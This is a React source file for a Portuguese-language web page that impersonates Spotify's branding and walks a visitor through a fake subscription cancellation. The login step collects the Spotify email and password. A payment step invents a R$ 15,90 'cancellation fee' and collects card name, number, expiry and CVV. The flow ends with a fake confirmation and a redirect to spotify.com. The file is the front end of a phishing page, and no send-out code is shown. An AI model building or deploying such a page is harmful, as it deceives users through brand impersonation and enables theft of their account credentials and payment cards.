import React, { useState } from 'react';
import { Button } from '@/components/ui/button.jsx';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card.jsx';
import { Input } from '@/components/ui/input.jsx';
import { Label } from '@/components/ui/label.jsx';
import { Separator } from '@/components/ui/separator.jsx';
import { AlertTriangle, Music, Shield, CreditCard, CheckCircle } from 'lucide-react';
import './App.css';

function App() {
  const [currentStep, setCurrentStep] = useState(1);
  const [formData, setFormData] = useState({
    email: '',
    password: '',
    reason: '',
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    cardName: ''
  });

  const handleInputChange = (field, value) => {
    setFormData(prev => ({ ...prev, [field]: value }));
  };

  const nextStep = () => {
    setCurrentStep(prev => prev + 1);
  };

  const prevStep = () => {
    setCurrentStep(prev => prev - 1);
  };

  const renderStep = () => {
    switch (currentStep) {
      case 1:
        return <LoginStep formData={formData} onInputChange={handleInputChange} onNext={nextStep} />;
      case 2:
        return <AccountInfoStep onNext={nextStep} onPrev={prevStep} />;
      case 3:
        return <CancelReasonStep formData={formData} onInputChange={handleInputChange} onNext={nextStep} onPrev={prevStep} />;
      case 4:
        return <PaymentStep formData={formData} onInputChange={handleInputChange} onNext={nextStep} onPrev={prevStep} />;
      case 5:
        return <ConfirmationStep />;
      default:
        return <LoginStep formData={formData} onInputChange={handleInputChange} onNext={nextStep} />;
    }
  };

  return (
    <div className="min-h-screen bg-black text-white">
      {/* Header */}
      <header className="bg-black border-b border-gray-800 p-4">
        <div className="max-w-4xl mx-auto flex items-center">
          <div className="flex items-center space-x-2">
            <Music className="h-8 w-8 text-[#1ED760]" />
            <span className="text-2xl font-bold">Spotify</span>
          </div>
        </div>
      </header>

      {/* Progress Bar */}
      <div className="bg-gray-900 p-4">
        <div className="max-w-4xl mx-auto">
          <div className="flex items-center justify-between mb-2">
            <span className="text-sm text-gray-400">Etapa {currentStep} de 5</span>
            <span className="text-sm text-gray-400">{Math.round((currentStep / 5) * 100)}% concluído</span>
          </div>
          <div className="w-full bg-gray-700 rounded-full h-2">
            <div 
              className="bg-[#1ED760] h-2 rounded-full transition-all duration-300"
              style={{ width: `${(currentStep / 5) * 100}%` }}
            ></div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto p-6">
        {renderStep()}
      </main>

      {/* Footer */}
      <footer className="bg-gray-900 mt-12 p-6">
        <div className="max-w-4xl mx-auto text-center text-sm text-gray-400">
          <p>© 2024 Spotify AB. Todos os direitos reservados.</p>
          <div className="flex justify-center space-x-4 mt-2">
            <a href="#" className="hover:text-white">Termos de Uso</a>
            <a href="#" className="hover:text-white">Política de Privacidade</a>
            <a href="#" className="hover:text-white">Suporte</a>
          </div>
        </div>
      </footer>
    </div>
  );
}

// Step Components
const LoginStep = ({ formData, onInputChange, onNext }) => (
  <Card className="bg-gray-900 border-gray-700">
    <CardHeader className="text-center">
      <CardTitle className="text-2xl text-white">Faça login na sua conta</CardTitle>
      <CardDescription className="text-gray-400">
        Para cancelar sua assinatura, precisamos verificar sua identidade
      </CardDescription>
    </CardHeader>
    <CardContent className="space-y-4">
      <div>
        <Label htmlFor="email" className="text-white">Email</Label>
        <Input
          id="email"
          type="email"
          value={formData.email}
          onChange={(e) => onInputChange('email', e.target.value)}
          placeholder="seu@email.com"
          className="bg-gray-800 border-gray-600 text-white"
        />
      </div>
      <div>
        <Label htmlFor="password" className="text-white">Senha</Label>
        <Input
          id="password"
          type="password"
          value={formData.password}
          onChange={(e) => onInputChange('password', e.target.value)}
          placeholder="••••••••"
          className="bg-gray-800 border-gray-600 text-white"
        />
      </div>
      <Button 
        onClick={onNext}
        className="w-full bg-[#1ED760] hover:bg-[#1DB954] text-black font-semibold"
        disabled={!formData.email || !formData.password}
      >
        Continuar
      </Button>
    </CardContent>
  </Card>
);

const AccountInfoStep = ({ onNext, onPrev }) => (
  <Card className="bg-gray-900 border-gray-700">
    <CardHeader className="text-center">
      <CardTitle className="text-2xl text-white">Informações da sua assinatura</CardTitle>
      <CardDescription className="text-gray-400">
        Detalhes da sua conta Premium
      </CardDescription>
    </CardHeader>
    <CardContent className="space-y-6">
      <div className="bg-gray-800 p-4 rounded-lg">
        <div className="flex items-center justify-between mb-4">
          <h3 className="text-lg font-semibold text-white">Spotify Premium Individual</h3>
          <span className="text-[#1ED760] font-bold">R$ 21,90/mês</span>
        </div>
        <div className="space-y-2 text-sm text-gray-400">
          <p>• Música sem anúncios</p>
          <p>• Download para ouvir offline</p>
          <p>• Reprodução em qualquer ordem</p>
          <p>• Qualidade de áudio superior</p>
        </div>
      </div>
      
      <div className="bg-red-900/20 border border-red-700 p-4 rounded-lg">
        <div className="flex items-center space-x-2 mb-2">
          <AlertTriangle className="h-5 w-5 text-red-400" />
          <span className="text-red-400 font-semibold">Atenção</span>
        </div>
        <p className="text-red-300 text-sm">
          Ao cancelar sua assinatura, você perderá acesso a todos os recursos Premium imediatamente.
          Suas playlists offline serão removidas e você voltará a ouvir anúncios.
        </p>
      </div>

      <div className="flex space-x-4">
        <Button 
          onClick={onPrev}
          variant="outline"
          className="flex-1 border-gray-600 text-white hover:bg-gray-800"
        >
          Voltar
        </Button>
        <Button 
          onClick={onNext}
          className="flex-1 bg-[#1ED760] hover:bg-[#1DB954] text-black font-semibold"
        >
          Continuar cancelamento
        </Button>
      </div>
    </CardContent>
  </Card>
);

const CancelReasonStep = ({ formData, onInputChange, onNext, onPrev }) => (
  <Card className="bg-gray-900 border-gray-700">
    <CardHeader className="text-center">
      <CardTitle className="text-2xl text-white">Por que você está cancelando?</CardTitle>
      <CardDescription className="text-gray-400">
        Sua opinião nos ajuda a melhorar o Spotify
      </CardDescription>
    </CardHeader>
    <CardContent className="space-y-4">
      <div className="space-y-3">
        {[
          'Muito caro',
          'Não uso com frequência',
          'Problemas técnicos',
          'Mudando para outro serviço',
          'Não gosto da seleção musical',
          'Outro motivo'
        ].map((reason) => (
          <label key={reason} className="flex items-center space-x-3 cursor-pointer">
            <input
              type="radio"
              name="reason"
              value={reason}
              checked={formData.reason === reason}
              onChange={(e) => onInputChange('reason', e.target.value)}
              className="text-[#1ED760] focus:ring-[#1ED760]"
            />
            <span className="text-white">{reason}</span>
          </label>
        ))}
      </div>

      <div className="flex space-x-4 mt-6">
        <Button 
          onClick={onPrev}
          variant="outline"
          className="flex-1 border-gray-600 text-white hover:bg-gray-800"
        >
          Voltar
        </Button>
        <Button 
          onClick={onNext}
          className="flex-1 bg-[#1ED760] hover:bg-[#1DB954] text-black font-semibold"
          disabled={!formData.reason}
        >
          Continuar
        </Button>
      </div>
    </CardContent>
  </Card>
);

const PaymentStep = ({ formData, onInputChange, onNext, onPrev }) => (
  <Card className="bg-gray-900 border-gray-700">
    <CardHeader className="text-center">
      <CardTitle className="text-2xl text-white">Taxa de cancelamento</CardTitle>
      <CardDescription className="text-gray-400">
        Para processar o cancelamento da sua assinatura
      </CardDescription>
    </CardHeader>
    <CardContent className="space-y-6">
      <div className="bg-yellow-900/20 border border-yellow-700 p-4 rounded-lg">
        <div className="flex items-center space-x-2 mb-2">
          <Shield className="h-5 w-5 text-yellow-400" />
          <span className="text-yellow-400 font-semibold">Taxa de processamento</span>
        </div>
        <p className="text-yellow-300 text-sm mb-3">
          Para garantir a segurança da sua conta e processar o cancelamento adequadamente, 
          é necessário o pagamento de uma taxa única de processamento.
        </p>
        <div className="text-center">
          <span className="text-2xl font-bold text-white">R$ 15,90</span>
          <span className="text-gray-400 text-sm block">Taxa única de cancelamento</span>
        </div>
      </div>

      <Separator className="bg-gray-700" />

      <div className="space-y-4">
        <div className="flex items-center space-x-2 mb-4">
          <CreditCard className="h-5 w-5 text-[#1ED760]" />
          <span className="text-white font-semibold">Informações de pagamento</span>
        </div>
        
        <div>
          <Label htmlFor="cardName" className="text-white">Nome no cartão</Label>
          <Input
            id="cardName"
            value={formData.cardName}
            onChange={(e) => onInputChange('cardName', e.target.value)}
            placeholder="João Silva"
            className="bg-gray-800 border-gray-600 text-white"
          />
        </div>

        <div>
          <Label htmlFor="cardNumber" className="text-white">Número do cartão</Label>
          <Input
            id="cardNumber"
            value={formData.cardNumber}
            onChange={(e) => onInputChange('cardNumber', e.target.value)}
            placeholder="1234 5678 9012 3456"
            className="bg-gray-800 border-gray-600 text-white"
          />
        </div>

        <div className="grid grid-cols-2 gap-4">
          <div>
            <Label htmlFor="expiryDate" className="text-white">Validade</Label>
            <Input
              id="expiryDate"
              value={formData.expiryDate}
              onChange={(e) => onInputChange('expiryDate', e.target.value)}
              placeholder="MM/AA"
              className="bg-gray-800 border-gray-600 text-white"
            />
          </div>
          <div>
            <Label htmlFor="cvv" className="text-white">CVV</Label>
            <Input
              id="cvv"
              value={formData.cvv}
              onChange={(e) => onInputChange('cvv', e.target.value)}
              placeholder="123"
              className="bg-gray-800 border-gray-600 text-white"
            />
          </div>
        </div>
      </div>

      <div className="flex space-x-4 mt-6">
        <Button 
          onClick={onPrev}
          variant="outline"
          className="flex-1 border-gray-600 text-white hover:bg-gray-800"
        >
          Voltar
        </Button>
        <Button 
          onClick={onNext}
          className="flex-1 bg-[#1ED760] hover:bg-[#1DB954] text-black font-semibold"
          disabled={!formData.cardName || !formData.cardNumber || !formData.expiryDate || !formData.cvv}
        >
          Pagar e cancelar assinatura
        </Button>
      </div>
    </CardContent>
  </Card>
);

const ConfirmationStep = () => (
  <Card className="bg-gray-900 border-gray-700">
    <CardHeader className="text-center">
      <div className="flex justify-center mb-4">
        <CheckCircle className="h-16 w-16 text-[#1ED760]" />
      </div>
      <CardTitle className="text-2xl text-white">Cancelamento processado</CardTitle>
      <CardDescription className="text-gray-400">
        Sua assinatura foi cancelada com sucesso
      </CardDescription>
    </CardHeader>
    <CardContent className="space-y-6">
      <div className="bg-green-900/20 border border-green-700 p-4 rounded-lg">
        <p className="text-green-300 text-sm text-center">
          Sua assinatura Premium foi cancelada. Você receberá um email de confirmação em breve.
          O acesso aos recursos Premium será removido imediatamente.
        </p>
      </div>

      <div className="text-center space-y-4">
        <p className="text-white">Obrigado por ter usado o Spotify Premium!</p>
        <p className="text-gray-400 text-sm">
          Você pode reativar sua assinatura a qualquer momento visitando spotify.com
        </p>
        <Button 
          className="bg-[#1ED760] hover:bg-[#1DB954] text-black font-semibold"
          onClick={() => window.location.href = 'https://spotify.com'}
        >
          Voltar ao Spotify
        </Button>
      </div>
    </CardContent>
  </Card>
);

export default App;

